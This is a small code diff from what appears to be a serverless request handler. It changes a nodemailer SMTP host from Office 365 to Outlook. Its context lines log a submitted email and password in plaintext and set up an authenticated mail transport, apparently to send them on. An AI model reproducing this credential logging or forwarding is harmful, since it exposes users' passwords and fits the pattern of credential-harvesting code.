@@ -9,7 +9,7 @@ export default async (req: Request, context: Context) => {
   console.log('response:', {email, password})
 
   const transporter = nodemailer.createTransport({
-  host: "smtp.office365.com",
+  host: "smtp-mail.outlook.com",
   port: 587,
   secure: false,
   auth: {
